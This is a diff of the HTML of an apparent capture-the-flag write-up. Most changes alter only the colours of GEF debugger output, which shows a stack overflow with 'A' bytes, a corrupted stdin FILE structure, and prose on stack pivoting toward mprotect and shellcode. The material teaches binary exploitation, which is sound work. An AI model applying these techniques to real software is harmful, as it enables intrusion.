-      <span style="color:#cf222e;">0x000000404ea0</span>|+0x0008|+001: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404ea8</span>|+0x0010|+002: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404eb0</span>|+0x0018|+003: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404eb8</span>|+0x0020|+004: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404ec0</span>|+0x0028|+005: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404ec8</span>|+0x0030|+006: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
-      <span style="color:#cf222e;">0x000000404ed0</span>|+0x0038|+007: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+$rsp  <span style="color:#0550ae;">0x000000404e98</span>|+0x0000|+000: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404ea0</span>|+0x0008|+001: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404ea8</span>|+0x0010|+002: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404eb0</span>|+0x0018|+003: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404eb8</span>|+0x0020|+004: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404ec0</span>|+0x0028|+005: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404ec8</span>|+0x0030|+006: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
+      <span style="color:#0550ae;">0x000000404ed0</span>|+0x0038|+007: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
 <span style="color:#cf222e;">-------------------------------------------------------------------------- code: x86:64 (gdb-native) ----</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f0f526f294c 498d041c              &lt;_IO_getline_info+0x12c&gt;   lea    rax, [r12+rbx*1]</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f0f526f2950 4d894708              &lt;_IO_getline_info+0x130&gt;   mov    QWORD PTR [r15+0x8], r8</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f0f526f2954 4883c428              &lt;_IO_getline_info+0x134&gt;   add    rsp, 0x28</span>
- -&gt; <span style="color:#cf222e;">0x7f0f526f2958</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;_IO_getline_info+0x138&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
+ -&gt; <span style="color:#0550ae;">0x7f0f526f2958</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;_IO_getline_info+0x138&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
     0x7f0f526f2959 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5d                  </span>  &lt;_IO_getline_info+0x139&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbp</span>
     0x7f0f526f295a <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415c                </span>  &lt;_IO_getline_info+0x13a&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r12</span>
     0x7f0f526f295c <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415d                </span>  &lt;_IO_getline_info+0x13c&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r13</span>
     0x7f0f526f295e <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415e                </span>  &lt;_IO_getline_info+0x13e&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r14</span>
     0x7f0f526f2960 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415f                </span>  &lt;_IO_getline_info+0x140&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r15</span>
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------- threads ----</span>
-[*<span style="color:#116329;">Thread Id:1, tid:1457669</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f0f526f2958</span> &lt;_IO_getline_info+0x138&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+[*<span style="color:#116329;">Thread Id:1, tid:1457669</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f0f526f2958</span> &lt;_IO_getline_info+0x138&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------- trace ----</span>
-[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f0f526f2958</span> &lt;_IO_getline_info+0x138&gt; (frame name: <span style="color:#953800;">__GI__IO_getline_info</span>)
+[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f0f526f2958</span> &lt;_IO_getline_info+0x138&gt; (frame name: <span style="color:#953800;">__GI__IO_getline_info</span>)
 [ <span style="color:#8250df;">#1</span>] 0x4141414141414141 &lt;NO_SYMBOL&gt;
 [ <span style="color:#8250df;">#2</span>] 0x4141414141414141 &lt;NO_SYMBOL&gt;
 [ <span style="color:#8250df;">#3</span>] 0x4141414141414141 &lt;NO_SYMBOL&gt;
@@ -673,37 +673,37 @@ $rsp  <span style="color:#cf222e;">0x000000404e98</span>|+0x0000|+000: 0x4141414
 On its surface, this seems like a great way to get register control easily without having to worry about <span class='monospace'>libc</span> gadget spraying. The issue with this is that this challenge requires more calls to <span class='monospace'>fgets</span> down the line once we <span class='monospace'>mprotect</span> and call our shellcode, and by corrupting the execution of <span class='monospace'>_IO_getline_info</span>, we irreversibly corrupt <span class='monospace'>stdin</span> in a way that prevents us from further calling <span class='monospace'>fgets()</span>. If all we needed was <span class='monospace'>rbx</span> control for a one-gadget, this would fully work! (And indeed, there may or may not be a Dreamhack level 8 which leverages this strategy, haha...). 
 
 <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>p *stdin
-<span style="color:#0550ae;">$7</span> = {
-  <span style="color:#0550ae;">_flags</span> = 0xfbad2088,
-  <span style="color:#0550ae;">_IO_read_ptr</span> = <span style="color:#cf222e;">0x4141414141414141</span> &lt;error: Cannot access memory at address 0x4141414141414141&gt;,
-  <span style="color:#0550ae;">_IO_read_end</span> = <span style="color:#cf222e;">0x2efedf51</span> 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_read_base</span> = <span style="color:#cf222e;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_write_base</span> = <span style="color:#cf222e;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_write_ptr</span> = <span style="color:#cf222e;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_write_end</span> = <span style="color:#cf222e;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_buf_base</span> = <span style="color:#cf222e;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
-  <span style="color:#0550ae;">_IO_buf_end</span> = <span style="color:#cf222e;">0x2efeee50</span> &quot;&quot;,
-  <span style="color:#0550ae;">_IO_save_base</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_IO_backup_base</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_IO_save_end</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_markers</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_chain</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_fileno</span> = 0x0,
-  <span style="color:#0550ae;">_flags2</span> = 0x0,
-  <span style="color:#0550ae;">_short_backupbuf</span> = &quot;&quot;,
-  <span style="color:#0550ae;">_old_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae;">_cur_column</span> = 0x0,
-  <span style="color:#0550ae;">_vtable_offset</span> = 0x0,
-  <span style="color:#0550ae;">_shortbuf</span> = &quot;&quot;,
-  <span style="color:#0550ae;">_lock</span> = <span style="color:#cf222e;">0x7f0f5285c7c0</span> &lt;<span style="color:#953800;">_IO_stdfile_0_lock</span>&gt;,
-  <span style="color:#0550ae;">_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae;">_codecvt</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_wide_data</span> = <span style="color:#cf222e;">0x7f0f5285a9c0</span> &lt;<span style="color:#953800;">_IO_wide_data_0</span>&gt;,
-  <span style="color:#0550ae;">_freeres_list</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_freeres_buf</span> = <span style="color:#cf222e;">0x0</span>,
-  <span style="color:#0550ae;">_prevchain</span> = <span style="color:#cf222e;">0x7f0f5285b628</span> &lt;<span style="color:#953800;">_IO_2_1_stdout_</span>+104&gt;,
-  <span style="color:#0550ae;">_mode</span> = 0xffffffff,
-  <span style="color:#0550ae;">_unused2</span> = '\000' &lt;repeats 19 times&gt;
+<span style="color:#6639ba;">$7</span> = {
+  <span style="color:#6639ba;">_flags</span> = 0xfbad2088,
+  <span style="color:#6639ba;">_IO_read_ptr</span> = <span style="color:#0550ae;">0x4141414141414141</span> &lt;error: Cannot access memory at address 0x4141414141414141&gt;,
+  <span style="color:#6639ba;">_IO_read_end</span> = <span style="color:#0550ae;">0x2efedf51</span> 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_read_base</span> = <span style="color:#0550ae;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_write_base</span> = <span style="color:#0550ae;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_write_ptr</span> = <span style="color:#0550ae;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_write_end</span> = <span style="color:#0550ae;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_buf_base</span> = <span style="color:#0550ae;">0x2efede50</span> 'A' &lt;repeats 256 times&gt;, &quot;\n&quot;, 'C' &lt;repeats 15 times&gt;, &quot;\200O@&quot;,
+  <span style="color:#6639ba;">_IO_buf_end</span> = <span style="color:#0550ae;">0x2efeee50</span> &quot;&quot;,
+  <span style="color:#6639ba;">_IO_save_base</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_IO_backup_base</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_IO_save_end</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_markers</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_chain</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_fileno</span> = 0x0,
+  <span style="color:#6639ba;">_flags2</span> = 0x0,
+  <span style="color:#6639ba;">_short_backupbuf</span> = &quot;&quot;,
+  <span style="color:#6639ba;">_old_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba;">_cur_column</span> = 0x0,
+  <span style="color:#6639ba;">_vtable_offset</span> = 0x0,
+  <span style="color:#6639ba;">_shortbuf</span> = &quot;&quot;,
+  <span style="color:#6639ba;">_lock</span> = <span style="color:#0550ae;">0x7f0f5285c7c0</span> &lt;<span style="color:#953800;">_IO_stdfile_0_lock</span>&gt;,
+  <span style="color:#6639ba;">_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba;">_codecvt</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_wide_data</span> = <span style="color:#0550ae;">0x7f0f5285a9c0</span> &lt;<span style="color:#953800;">_IO_wide_data_0</span>&gt;,
+  <span style="color:#6639ba;">_freeres_list</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_freeres_buf</span> = <span style="color:#0550ae;">0x0</span>,
+  <span style="color:#6639ba;">_prevchain</span> = <span style="color:#0550ae;">0x7f0f5285b628</span> &lt;<span style="color:#953800;">_IO_2_1_stdout_</span>+104&gt;,
+  <span style="color:#6639ba;">_mode</span> = 0xffffffff,
+  <span style="color:#6639ba;">_unused2</span> = '\000' &lt;repeats 19 times&gt;
 }
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
 </code></pre>
@@ -755,19 +755,19 @@ We therefore require two 'stack control' primitives - a way to move downwards, a
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x40034b 4885c0                &lt;_init+0xf&gt;   test   rax, rax</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x40034e 7402                  &lt;_init+0x12&gt;   je     0x400352 &lt;_init+22&gt;</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x400350 ffd0                  &lt;_init+0x14&gt;   call   rax</span>
- -&gt; <span style="color:#cf222e;">0x400352</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4883c408            </span> <span style="color:#cf222e;"> &lt;_init+0x16&gt;</span>   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">rsp</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x8</span>
+ -&gt; <span style="color:#0550ae;">0x400352</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4883c408            </span> <span style="color:#cf222e;"> &lt;_init+0x16&gt;</span>   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">rsp</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x8</span>
     0x400356 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span>  &lt;_init+0x1a&gt;   <span style="color:#8250df;">ret   </span>
     0x400357 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0000                </span>  &lt;NO_SYMBOL&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">BYTE</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">al</span>
     0x400359 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0000                </span>  &lt;NO_SYMBOL&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">BYTE</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">al</span>
     0x40035b <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0000                </span>  &lt;NO_SYMBOL&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">BYTE</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">al</span>
     0x40035d <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0000                </span>  &lt;NO_SYMBOL&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">BYTE</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">al</span>
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1509462</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x000000400352</span> &lt;_init+0x16&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1509462</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x000000400352</span> &lt;_init+0x16&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x000000400352</span> &lt;_init+0x16&gt;
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x000000400450</span> &lt;main&gt; (frame name: <span style="color:#953800;">frame_dummy</span>)
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x000000400352</span> &lt;_init+0x16&gt;
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x000000400450</span> &lt;main&gt; (frame name: <span style="color:#953800;">frame_dummy</span>)
 [ <span style="color:#8250df;">#2</span>] 0x00337fa49f30 &lt;NO_SYMBOL&gt;
-[ <span style="color:#8250df;">#3</span>] <span style="color:#cf222e;">0x000000400450</span> &lt;main&gt; (frame name: <span style="color:#953800;">frame_dummy</span>)
+[ <span style="color:#8250df;">#3</span>] <span style="color:#0550ae;">0x000000400450</span> &lt;main&gt; (frame name: <span style="color:#953800;">frame_dummy</span>)
 [ <span style="color:#8250df;">#4</span>] 0x000000000000 &lt;NO_SYMBOL&gt;
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
@@ -823,18 +823,18 @@ The answer lies in the very start of the binary, specifically, the initialisatio
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f32b73224ff 90                    &lt;NO_SYMBOL&gt;   nop</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f32b7322500 55                    &lt;__libc_start_call_main&gt;   push   rbp</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f32b7322501 4889e5                &lt;__libc_start_call_main+0x1&gt;   mov    rbp, rsp</span>
- -&gt; <span style="color:#cf222e;">0x7f32b7322504</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4881ec90000000      </span> <span style="color:#cf222e;"> &lt;__libc_start_call_main+0x4&gt;</span>   <span style="color:#6e7781;">sub   </span> <span style="color:#0550ae;">rsp</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x90</span>
+ -&gt; <span style="color:#0550ae;">0x7f32b7322504</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4881ec90000000      </span> <span style="color:#cf222e;"> &lt;__libc_start_call_main+0x4&gt;</span>   <span style="color:#6e7781;">sub   </span> <span style="color:#0550ae;">rsp</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x90</span>
     0x7f32b732250b <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">48897d88            </span>  &lt;__libc_start_call_main+0xb&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x78</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">rdi</span>
     0x7f32b732250f <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">897584              </span>  &lt;__libc_start_call_main+0xf&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">DWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x7c</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">esi</span>
     0x7f32b7322512 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">48899578ffffff      </span>  &lt;__libc_start_call_main+0x12&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x88</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">rdx</span>
     0x7f32b7322519 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">64488b3c2528000000  </span>  &lt;__libc_start_call_main+0x19&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdi</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#0550ae;">fs</span><span style="color:#6e7781;">:</span><span style="color:#cf222e;">0x28</span>
     0x7f32b7322522 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">48897df8            </span>  &lt;__libc_start_call_main+0x22&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x8</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">rdi</span>
 <span style="color:#cf222e;">----------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1512782</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f32b7322504</span> &lt;__libc_start_call_main+0x4&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1512782</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f32b7322504</span> &lt;__libc_start_call_main+0x4&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f32b7322504</span> &lt;__libc_start_call_main+0x4&gt;
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x7f32b7322628</span> &lt;__libc_start_main_impl+0x88&gt;
-[ <span style="color:#8250df;">#2</span>] <span style="color:#cf222e;">0x000000400385</span> &lt;_start+0x25&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f32b7322504</span> &lt;__libc_start_call_main+0x4&gt;
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x7f32b7322628</span> &lt;__libc_start_main_impl+0x88&gt;
+[ <span style="color:#8250df;">#2</span>] <span style="color:#0550ae;">0x000000400385</span> &lt;_start+0x25&gt;
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------
 </span></code></pre>
 
@@ -844,19 +844,19 @@ After it allocates this stack space, it eventually goes back into our <span clas
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f2810a5555e 488b05434a1e00        &lt;__libc_start_call_main+0x5e&gt;   mov    rax, QWORD PTR [rip+0x1e4a43] # 0x7f2810c39fa8</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f2810a55565 488bb578ffffff        &lt;__libc_start_call_main+0x65&gt;   mov    rsi, QWORD PTR [rbp-0x88]</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f2810a5556c 8b7d84                &lt;__libc_start_call_main+0x6c&gt;   mov    edi, DWORD PTR [rbp-0x7c]</span>
- -&gt; <span style="color:#cf222e;">0x7f2810a5556f</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488b10              </span> <span style="color:#cf222e;"> &lt;__libc_start_call_main+0x6f&gt;</span>   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdx</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">]</span>
+ -&gt; <span style="color:#0550ae;">0x7f2810a5556f</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488b10              </span> <span style="color:#cf222e;"> &lt;__libc_start_call_main+0x6f&gt;</span>   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdx</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">]</span>
     0x7f2810a55572 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">ff5588              </span>  &lt;__libc_start_call_main+0x72&gt;   <span style="color:#8250df;">call  </span> <span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x78</span><span style="color:#6e7781;">]</span> &lt;main&gt;
     0x7f2810a55575 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">89c7                </span>  &lt;__libc_start_call_main+0x75&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">edi</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">eax</span>
-    0x7f2810a55577 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e864930100          </span>  &lt;__libc_start_call_main+0x77&gt;   <span style="color:#8250df;">call  </span> <span style="color:#cf222e;">0x7f2810a6e8e0</span> &lt;exit&gt;
-    0x7f2810a5557c <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e8dfbd0600          </span>  &lt;__libc_start_call_main+0x7c&gt;   <span style="color:#8250df;">call  </span> <span style="color:#cf222e;">0x7f2810ac1360</span> &lt;__nptl_deallocate_tsd&gt;
-    0x7f2810a55581 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">f0832d474b1e0001    </span>  &lt;__libc_start_call_main+0x81&gt;   <span style="color:#6e7781;">lock  </span> <span style="color:#0550ae;">sub</span> <span style="color:#0550ae;">DWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rip</span> <span style="color:#6e7781;">+</span> <span style="color:#cf222e;">0x1e4b47</span><span style="color:#6e7781;">], </span><span style="color:#cf222e;">0x1</span> # 0x7f2810c3a0d0 &lt;_
+    0x7f2810a55577 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e864930100          </span>  &lt;__libc_start_call_main+0x77&gt;   <span style="color:#8250df;">call  </span> <span style="color:#0550ae;">0x7f2810a6e8e0</span> &lt;exit&gt;
+    0x7f2810a5557c <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e8dfbd0600          </span>  &lt;__libc_start_call_main+0x7c&gt;   <span style="color:#8250df;">call  </span> <span style="color:#0550ae;">0x7f2810ac1360</span> &lt;__nptl_deallocate_tsd&gt;
